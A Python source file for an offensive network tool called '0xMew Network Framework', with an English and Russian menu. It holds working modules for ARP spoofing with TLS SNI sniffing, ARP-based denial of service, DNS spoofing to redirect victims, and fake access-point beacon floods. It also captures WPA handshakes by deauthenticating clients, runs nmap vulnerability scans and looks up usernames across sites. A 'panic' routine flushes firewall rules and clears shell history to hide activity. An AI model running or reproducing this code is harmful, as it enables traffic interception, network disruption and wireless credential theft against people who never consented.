import os
import sys
import time
import signal
import subprocess
import urllib.request
import urllib.error
import threading
import random
from scapy.all import *
from scapy.layers.tls.all import TLS, TLSClientHello
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap
from scapy.layers.inet import ICMP, IP

# --- НАСТРОЙКИ ---
conf.verb = 0
CURRENT_LANG = 'en'

# СЛОВАРЬ ПЕРЕВОДОВ
TRANS = {
    'en': {
        'banner_subtitle': "/// 0xMew Network Framework v3.4 (Stable) ///",
        'h_local': " local_network ", 'h_recon': " information_gathering ",
        'h_wifi': " wireless_attacks ", 'h_osint': " osint_person ", 'h_utils': " utilities ",
        'opt_1': "1. arp_spoof (MITM)", 'opt_2': "2. arp_kill (DoS)", 'opt_7': "7. dns_spoof (Redirect)",
        'opt_3': "3. scan_network (Passive OS)", 'opt_6': "6. nmap_scanner (Port/Vuln)", 'opt_4': "4. opsec_check (Identity)",
        'opt_8': "8. fake_ap (Beacon Flood)", 'opt_9': "9. wpa_hunter (Handshake)",
        'opt_5': "5. mr_holmes (Usernames)", 'opt_99': "99. panic_button (NUKE)",
        'iface': "IFACE", 'gw': "GW",
        'prompt_target': "target > ", 'prompt_user': "username > ",
        'prompt_domain': "domain (empty=all) > ", 'prompt_redirect': "redirect_ip (empty=self) > ",
        'prompt_ssid': "base_ssid (empty=0XMEW) > ", 'prompt_count': "count (1-99) > ",
        'back_tip': "Type 'back' to return",
        'scan_os_start': "[*] Scanning & Fingerprinting...",
        'os_linux': "Linux/Mobile", 'os_win': "Windows", 'os_cisco': "Cisco/Net", 'os_unknown': "Unknown",
        'nuke_msg': "\n\033[91m[!!!] NUKE INITIATED [!!!]\033[0m", 'nuke_done': "System Clean.",
        'wpa_warn': "\033[93m [!] Need 'aircrack-ng'.\033[0m",
        'wpa_step1': "[*] Scanning targets (Ctrl+C to stop)...",
        'wpa_bssid': "BSSID > ", 'wpa_ch': "Channel > ",
        'wpa_cap': "[*] Capturing Handshake... (see captures/)",
        'fakeap_warn_mon': "\033[93m [?] Monitor Mode supported? (y/n): \033[0m",
        'fakeap_warn_net': "\033[91m [!] Internet will be LOST on {}. Continue? (y/n): \033[0m",
        'fakeap_start': "[*] Flooding {} networks (Base: '{}')...", 'fakeap_info': " [i] Press Ctrl+C to stop.",
        'dns_start': "[*] DNS Spoofing {} -> {}", 'dns_hit': " [DNS] Hit {} -> {}",
        'opsec_start': "[*] Analyzing Identity...",
        'verdict_bad': "[!] VERDICT: EXPOSED (Factory MAC detected)",
        'verdict_good': "[+] VERDICT: ANONYMOUS (MAC Spoofed)",
        'ask_mac': " [?] SPOOF MAC NOW? (y/n): ",
        'mac_done': " [+] MAC Randomized.",
        'attack_start': "[*] Attack started on {}.", 'stop_msg': "\n[*] Stopping...",
        'kill_enable': "[*] Blocking traffic...", 'kill_disable': "[*] Unblocking...",
        'holmes_found': " [+] FOUND: {}",
    },
    'ru': {
        'banner_subtitle': "/// 0xMew Network Framework v3.4 (Stable) ///",
        'h_local': " local_network ", 'h_recon': " information_gathering ",
        'h_wifi': " wireless_attacks ", 'h_osint': " osint_person ", 'h_utils': " utilities ",
        'opt_1': "1. arp_spoof (перехват)", 'opt_2': "2. arp_kill (DoS)", 'opt_7': "7. dns_spoof (редирект)",
        'opt_3': "3. scan_network (скан + OS)", 'opt_6': "6. nmap_scanner (порты)", 'opt_4': "4. opsec_check (анонимность)",
        'opt_8': "8. fake_ap (спам точками)", 'opt_9': "9. wpa_hunter (хендшейки)",
        'opt_5': "5. mr_holmes (поиск ника)", 'opt_99': "99. panic_button (СБРОС)",
        'iface': "IFACE", 'gw': "GW",
        'prompt_target': "target > ", 'prompt_user': "username > ",
        'prompt_domain': "domain (пусто=все) > ", 'prompt_redirect': "redirect_ip (пусто=я) > ",
        'prompt_ssid': "base_ssid (пусто=0XMEW) > ", 'prompt_count': "кол-во (1-99) > ",
        'back_tip': "Введи 'back' для отмены",
        'scan_os_start': "[*] Сканирование и анализ ОС...",
        'os_linux': "Linux/Mobile", 'os_win': "Windows", 'os_cisco': "Cisco/Net", 'os_unknown': "Unknown",
        'nuke_msg': "\n\033[91m[!!!] NUKE INITIATED [!!!]\033[0m", 'nuke_done': "Система очищена.",
        'wpa_warn': "\033[93m [!] Нужен пакет 'aircrack-ng'.\033[0m",
        'wpa_step1': "[*] Сканирую цели (Ctrl+C для выбора)...",
        'wpa_bssid': "BSSID > ", 'wpa_ch': "Channel > ",
        'wpa_cap': "[*] Ловим Handshake... (см. captures/)",
        'fakeap_warn_mon': "\033[93m [?] Карта поддерживает Monitor Mode? (y/n): \033[0m",
        'fakeap_warn_net': "\033[91m [!] Интернет на {} пропадет. Ок? (y/n): \033[0m",
        'fakeap_start': "[*] Флуд {} сетями (База: '{}')...",
        'fakeap_info': " [i] Ctrl+C для остановки.",
        'dns_start': "[*] DNS Spoofing {} -> {}",
        'dns_hit': " [DNS] Попался {} -> {}",
        'opsec_start': "[*] Проверка OpSec...",
        'verdict_bad': "[!] ВЕРДИКТ: НЕ АНОНИМЕН (Заводской MAC)",
        'verdict_good': "[+] ВЕРДИКТ: АНОНИМЕН (Спуфинг активен)",
        'ask_mac': " [?] Сменить MAC сейчас? (y/n): ",
        'mac_done': " [+] MAC сменен.",
        'attack_start': "[*] Атака на {}. Сниффинг...",
        'stop_msg': "\n[*] Остановка...",
        'kill_enable': "[*] Блокировка трафика...",
        'kill_disable': "[*] Разблокировка...",
        'holmes_found': " [+] НАЙДЕН: {}",
    }
}

def t(key): return TRANS[CURRENT_LANG].get(key, key)

BANNER = r"""
    ██████╗ ██╗  ██╗███╗   ███╗███████╗██╗    ██╗
   ██╔═████╗╚██╗██╔╝████╗ ████║██╔════╝██║    ██║
   ██║██╔██║ ╚███╔╝ ██╔████╔██║█████╗  ██║ █╗ ██║
   ████╔╝██║ ██╔██╗ ██║╚██╔╝██║██╔══╝  ██║███╗██║
   ╚██████╔╝██╔╝ ██╗██║ ╚═╝ ██║███████╗╚███╔███╔╝
    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝ ╚══╝╚══╝
"""

# --- CORE UTILS ---
def clear_screen(): os.system('clear')

def select_language():
    global CURRENT_LANG
    clear_screen()
    print(BANNER)
    print(" [1] English")
    print(" [2] Русский")
    try:
        choice = input("\nSelect language / Выберите язык [1/2]: ").strip()
        if choice == '2': CURRENT_LANG = 'ru'
        else: CURRENT_LANG = 'en'
    except KeyboardInterrupt: sys.exit()

def nuke_it_all(signum, frame):
    print(t('nuke_msg'))
    # FIX: Не убиваем python, иначе скрипт умрет ДО очистки iptables
    os.system("killall -9 tcpdump airodump-ng aireplay-ng 2>/dev/null")
    os.system("iptables -F && iptables -t nat -F && ip6tables -F")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    os.system("history -c && clear")
    print(t('nuke_done'))
    # Теперь выходим штатно
    sys.exit(0)
signal.signal(signal.SIGQUIT, nuke_it_all)

def get_default_info():
    try:
        res = subprocess.check_output("ip route | grep default", shell=True).decode()
        p = res.split()
        return p[2], p[4]
    except: return "192.168.1.1", "eth0"

def get_public_ip():
    try: return subprocess.check_output("curl -s --max-time 2 ifconfig.me", shell=True).decode().strip()
    except: return "Unknown"

def get_my_ip(iface):
    try: return subprocess.check_output(f"ip -4 addr show {iface} | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){{3}}'", shell=True).decode().strip()
    except: return "127.0.0.1"

def get_mac_address(iface):
    try: return open(f'/sys/class/net/{iface}/address').read().strip()
    except: return "??"

def change_mac_auto(iface):
    os.system(f"ip link set {iface} down")
    os.system(f"macchanger -r {iface} > /dev/null")
    os.system(f"ip link set {iface} up")
    time.sleep(2)
    print(f"\033[92m{t('mac_done')}\033[0m")

def toggle_forward(state):
    val = "1" if state else "0"
    os.system(f"echo {val} > /proc/sys/net/ipv4/ip_forward")

# --- MODULES ---
def guess_os(ttl):
    if ttl <= 64: return t('os_linux')
    elif ttl <= 128: return t('os_win')
    elif ttl <= 255: return t('os_cisco')
    return t('os_unknown')

def scan_net(gateway):
    print(f"\n{t('scan_os_start')}")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=f"{gateway}/24"), timeout=2, verbose=False)
    print(f"\n{'IP':<16} | {'MAC':<18} | {'OS GUESS'}")
    print("-" * 50)
    for _, rcv in ans:
        ip = rcv[ARP].psrc
        mac = rcv[ARP].hwsrc
        os_guess = "?"
        try:
            pkt = IP(dst=ip)/ICMP()
            reply = sr1(pkt, timeout=1, verbose=0)
            if reply: os_guess = guess_os(reply.ttl)
        except: pass
        print(f"{ip:<16} | {mac:<18} | {os_guess}")
    input("\n[Enter]...")

def run_wpa_handshake(iface):
    print(t('wpa_warn'))
    if input(t('fakeap_warn_mon')).lower() != 'y': return
    os.system("airmon-ng check kill > /dev/null 2>&1")
    os.system(f"ip link set {iface} down")
    os.system(f"iw dev {iface} set type monitor")
    os.system(f"ip link set {iface} up")
    print(t('wpa_step1'))
    try: subprocess.run(f"airodump-ng {iface}", shell=True)
    except KeyboardInterrupt: pass
    print("\n")
    bssid = input(t('wpa_bssid')).strip()
    channel = input(t('wpa_ch')).strip()
    if not bssid or not channel: return
    print(t('wpa_cap'))
    if not os.path.exists("captures"): os.makedirs("captures")
    file_prefix = f"captures/wpa_{bssid.replace(':','')}"
    dump_proc = subprocess.Popen(f"airodump-ng --bssid {bssid} --channel {channel} -w {file_prefix} {iface} > /dev/null 2>&1", shell=True)
    try:
        while True:
            subprocess.run(f"aireplay-ng --deauth 5 -a {bssid} {iface}", shell=True)
            time.sleep(5)
    except KeyboardInterrupt:
        dump_proc.terminate()
        os.system(f"ip link set {iface} down")
        os.system(f"iw dev {iface} set type managed")
        os.system(f"ip link set {iface} up")
        os.system("systemctl restart NetworkManager")

def run_fake_ap(iface, base_ssid, count_str):
    if input(t('fakeap_warn_mon')).lower() != 'y': return
    if input(t('fakeap_warn_net').format(iface)).lower() != 'y': return
    if not base_ssid: base_ssid = "0XMEW"
    try:
        count = int(count_str)
        if count < 1: count = 1;
        if count > 99: count = 99
    except: count = 1
    print(t('fakeap_mon'))
    os.system("airmon-ng check kill > /dev/null 2>&1")
    try:
        os.system(f"ip link set {iface} down")
        os.system(f"iw dev {iface} set type monitor")
        os.system(f"ip link set {iface} up")
    except: return
    print(t('fakeap_start').format(count, base_ssid))
    print(t('fakeap_info'))
    frames = []
    for i in range(count):
        current_ssid = base_ssid if count == 1 else f"{base_ssid}_{i+1:02d}"
        sender_mac = str(RandMAC())
        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=sender_mac, addr3=sender_mac)
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID', info=current_ssid, len=len(current_ssid))
        rsn = Dot11Elt(ID='RSNinfo', info=(b'\x01\x00\x00\x0f\xac\x02\x02\x00\x00\x0f\xac\x04\x00\x0f\xac\x02\x01\x00\x00\x0f\xac\x02\x00\x00'))
        frames.append(RadioTap()/dot11/beacon/essid/rsn)
    try: sendp(frames, iface=iface, inter=max(0.005, 0.1/count), loop=1, verbose=0)
    except KeyboardInterrupt:
        os.system(f"ip link set {iface} down")
        os.system(f"iw dev {iface} set type managed")
        os.system(f"ip link set {iface} up")
        os.system("systemctl restart NetworkManager")

def run_nmap_wrapper(target):
    print(f"\n [1] Fast  [2] Full  [3] Stealth  [4] Vuln")
    mode = input(f"\n Mode > ").strip()
    flags = ""
    if mode == '1': flags = "-T4 -F"
    elif mode == '2': flags = "-A -T4"
    elif mode == '3': flags = "-sS -Pn"
    elif mode == '4': flags = "--script vuln"
    else: return
    try: subprocess.run(f"nmap {flags} {target}", shell=True)
    except KeyboardInterrupt: pass
    input("\n[Enter]...")

def check_site(name, url, username):
    target_url = url.format(username)
    req = urllib.request.Request(target_url, headers={'User-Agent': 'Mozilla/5.0'})
    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            if response.getcode() == 200:
                print(f"\033[92m{t('holmes_found').format(name)}\033[0m -> {target_url}")
    except: pass

def run_holmes(username):
    print("-" * 40)
    sites = {
        "GitHub": "https://github.com/{}", "Telegram": "https://t.me/{}",
        "Reddit": "https://www.reddit.com/user/{}", "TikTok": "https://www.tiktok.com/@{}",
        "Instagram": "https://www.instagram.com/{}", "PornHub": "https://www.pornhub.com/users/{}"
    }
    threads = []
    for name, url in sites.items():
        t = threading.Thread(target=check_site, args=(name, url, username))
        threads.append(t)
        t.start()
        time.sleep(0.1)
    for t in threads: t.join()
    input("\n[Enter]...")

SPOOF_DOMAIN = ""
REDIRECT_IP = ""
def dns_responder(pkt):
    global SPOOF_DOMAIN, REDIRECT_IP
    if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
        qname = pkt[DNSQR].qname.decode()
        if SPOOF_DOMAIN == "" or SPOOF_DOMAIN in qname:
            print(f"\033[92m{t('dns_hit').format(qname, REDIRECT_IP)}\033[0m")
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                              an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=REDIRECT_IP))
            send(spoofed_pkt, verbose=0)
def sni_callback(pkt):
    if pkt.haslayer(TLSClientHello):
        try:
            sni = pkt[TLSClientHello].ext[0].servernames[0].decode()
            print(f" \033[95m[SNI]\033[0m {pkt[IP].src} -> {sni}")
        except: pass

def run_attack(mode, target, gateway, iface):
    toggle_forward(True)
    if mode == '2':
        print(t('kill_enable'))
        subprocess.run(f"iptables -A FORWARD -s {target} -j DROP", shell=True)
        subprocess.run(f"ip6tables -A FORWARD -j DROP", shell=True)
    if mode == '7':
        global SPOOF_DOMAIN, REDIRECT_IP
        SPOOF_DOMAIN = input(t('prompt_domain')).strip()
        REDIRECT_IP = input(t('prompt_redirect')).strip()
        if not REDIRECT_IP: REDIRECT_IP = get_my_ip(iface)
        print(t('dns_start').format(target, REDIRECT_IP))
        subprocess.run(f"iptables -A FORWARD -s {target} -p udp --dport 53 -j DROP", shell=True)

    callback = dns_responder if mode == '7' else sni_callback
    sniffer = AsyncSniffer(iface=iface, prn=callback, filter=f"host {target} and (port 443 or port 53)", store=0)
    sniffer.start()
    if mode == '1': print(t('attack_start').format(target))
    try:
        while True:
            send(ARP(op=2, pdst=target, psrc=gateway), verbose=False)
            send(ARP(op=2, pdst=gateway, psrc=target), verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        sniffer.stop()
        if mode == '2':
            print(t('kill_disable'))
            subprocess.run(f"iptables -D FORWARD -s {target} -j DROP", shell=True)
            subprocess.run(f"ip6tables -D FORWARD -j DROP", shell=True)
        if mode == '7':
            print(t('kill_disable'))
            subprocess.run(f"iptables -D FORWARD -s {target} -p udp --dport 53 -j DROP", shell=True)
        print(t('stop_msg'))

def check_opsec(iface):
    print(f"\n\033[93m{t('opsec_start')}\033[0m")
    print(f" EXT IP: \033[96m{get_public_ip()}\033[0m")

    current_mac = get_mac_address(iface)
    print(f" MAC:    \033[96m{current_mac}\033[0m")

    # FIX: Правильный парсинг ethtool
    try:
        # Разбиваем строку по "Permanent address:" и берем вторую часть
        output = subprocess.check_output(f"ethtool -P {iface}", shell=True).decode()
        perm = output.split("Permanent address:")[1].strip()

        if current_mac.lower() == perm.lower():
             # КРАСНЫЙ ВЕРДИКТ
             print(f"\n\033[91m{t('verdict_bad')}\033[0m")
             print(f" Real: {perm}")
             if input(t('ask_mac')).lower() == 'y': change_mac_auto(iface)
        else:
             # ЗЕЛЕНЫЙ ВЕРДИКТ
             print(f"\n\033[92m{t('verdict_good')}\033[0m")
             print(f" Real: {perm} -> Fake: {current_mac}")
    except: pass
    input("\n[Enter]...")

# --- MENU STYLER ---
def print_menu(iface, gw):
    clear_screen()
    print(f"\033[95m{BANNER}\033[0m")

    col1_head = f"\033[47m\033[30m{t('h_local'):<35}\033[0m"
    col2_head = f"\033[47m\033[30m{t('h_recon'):<35}\033[0m"
    col1_items = [t('opt_1'), t('opt_2'), t('opt_7')]
    col2_items = [t('opt_3'), t('opt_6'), t('opt_4')]

    col3_head = f"\033[47m\033[30m{t('h_wifi'):<35}\033[0m"
    col4_head = f"\033[47m\033[30m{t('h_osint'):<35}\033[0m"
    col3_items = [t('opt_8'), t('opt_9')]
    col4_items = [t('opt_5')]

    col5_head = f"\033[47m\033[30m{t('h_utils'):<35}\033[0m"
    col5_items = [t('opt_99')]

    print(f"{col1_head}   {col2_head}")
    for i in range(max(len(col1_items), len(col2_items))):
        c1 = col1_items[i] if i < len(col1_items) else ""
        c2 = col2_items[i] if i < len(col2_items) else ""
        print(f"{c1:<38} {c2}")

    print()
    print(f"{col3_head}   {col4_head}")
    for i in range(max(len(col3_items), len(col4_items))):
        c3 = col3_items[i] if i < len(col3_items) else ""
        c4 = col4_items[i] if i < len(col4_items) else ""
        print(f"{c3:<38} {c4}")

    print()
    print(f"{col5_head}")
    for item in col5_items: print(item)

    print(f"\n\033[95m0xMew\033[0m ~/# ", end="")

if __name__ == "__main__":
    if os.getuid() != 0:
        print("Run as root.")
        sys.exit()

    select_language()
    gw, iface = get_default_info()

    while True:
        try:
            print_menu(iface, gw)
            choice = input().strip()

            if choice in ['exit', 'quit']: nuke_it_all(None, None)
            if choice == '99': nuke_it_all(None, None)

            if choice == '3': scan_net(gw)
            if choice == '4': check_opsec(iface)
            if choice == '6':
                tgt = input(t('prompt_target'))
                if tgt != 'back': run_nmap_wrapper(tgt)

            if choice == '8':
                wlan = input(f"Interface (default {iface}): ") or iface
                ssid = input(t('prompt_ssid'))
                count = input(t('prompt_count'))
                run_fake_ap(wlan, ssid, count)

            if choice == '9':
                wlan = input(f"Interface (default {iface}): ") or iface
                run_wpa_handshake(wlan)

            if choice == '5':
                u = input(t('prompt_user'))
                if u != 'back': run_holmes(u)

            if choice in ['1', '2', '7']:
                target = input(t('prompt_target'))
                if target != 'back': run_attack(choice, target, gw, iface)

        except KeyboardInterrupt:
            # ЛОВИМ Ctrl+C ЗДЕСЬ И КОРРЕКТНО ВЫХОДИМ
            nuke_it_all(None, None)
